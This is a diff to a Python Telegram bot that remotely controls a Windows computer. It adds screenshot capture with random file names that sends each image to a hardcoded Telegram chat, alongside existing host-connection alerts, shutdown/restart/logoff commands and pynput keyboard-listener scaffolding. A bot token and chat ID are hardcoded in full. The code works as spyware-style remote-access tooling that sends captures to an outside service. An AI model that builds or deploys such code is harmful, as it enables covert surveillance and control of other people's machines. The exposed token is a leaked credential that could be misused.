@@ -4,12 +4,13 @@ import emoji
 from pynput import keyboard
 from datetime import datetime
 from pynput.keyboard import Key, Controller
-
-
+import random
+import pyautogui
+import datetime
 
 
 bot = telebot.TeleBot("1764092484:AAFH54usSJHnb36qu0xTIvbamqBVXEggnc0")
-telebot.apihelper.proxy = {'https':'http://10.57.10.34:3128'}
+# telebot.apihelper.proxy = {'https':'http://10.57.10.34:3128'}
 
 # ---------------------------------------------------------------------------
 def console(a):
@@ -33,7 +34,7 @@ def get_host_name():
 	return hostname.stdout.decode()
 def send_notify():
 	icon = emoji.emojize('⛔', language='es')
-	notify=icon+" ["+datetime.now().strftime('%Y-%m-%d %H:%M:%S')+"]"+'\n'+" Have connected from "+get_host_name()
+	notify=icon+" ["+str(datetime.datetime.now())+"]"+'\n'+" Have connected from "+get_host_name()
 	bot.send_message(990978363,notify)
 def shutdown():
 	shut = subprocess.run(["shutdown","/s"], stdout=subprocess.PIPE)
@@ -41,7 +42,7 @@ def shutdown():
 def Restart():
 	restart = subprocess.run(["shutdown","/r"], stdout=subprocess.PIPE)
 	return ((restart.stdout).decode())
-def log():
+def lock():
 	Log = subprocess.run(["shutdown","/l"], stdout=subprocess.PIPE)
 	return ((Log.stdout).decode())
 def send_notify_send_files():
@@ -59,11 +60,15 @@ def Listener():
 		listener.join()
 	listener = keyboard.Listener(on_press=on_press)
 	listener.stop()
-
+def random_name():
+    character='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    random_character=random.choice(character)+random.choice(character)+random.choice(character)+random.choice(character)
+    random_number=str(random.randint(11,100000))+str(random.randint(11,100000))
+    return str(datetime.date.today())+'_'+random_character+random_number+random_character+".png"
 def sceenshot():
-	keyboard=Controller()
-	with keyboard.pressed(Key.cmd):
-		keyboard.press(Key.print_screen)
+	a=random_name()
+	shot=pyautogui.screenshot(a)
+	bot.send_photo(chat_id=990978363,photo=open(a,'rb'))
 
 # ---------------------------------------------------------------------------
 
@@ -81,18 +86,18 @@ def send_system_run(message):
 
 @bot.message_handler(commands=['shutdowm'] )
 def send_system_run(message):
-	Listener()
+	bot.send_message(990978363,shutdown())
 
 @bot.message_handler(commands=['restart'] )
 def send_system_run(message):
-	bot.send_message(990978363,Listener())
+	bot.send_message(990978363,Restart())
 
 @bot.message_handler(commands=['log'] )
 def send_system_run(message):
-	bot.send_message(990978363,Listener())
+	bot.send_message(990978363,lock())
 
 @bot.message_handler(commands=['screen'] )
-def send_system_run(message):
+def send_screen(message):
 	sceenshot()
 	# code dùng để gửi ảnh viết vào đây
 
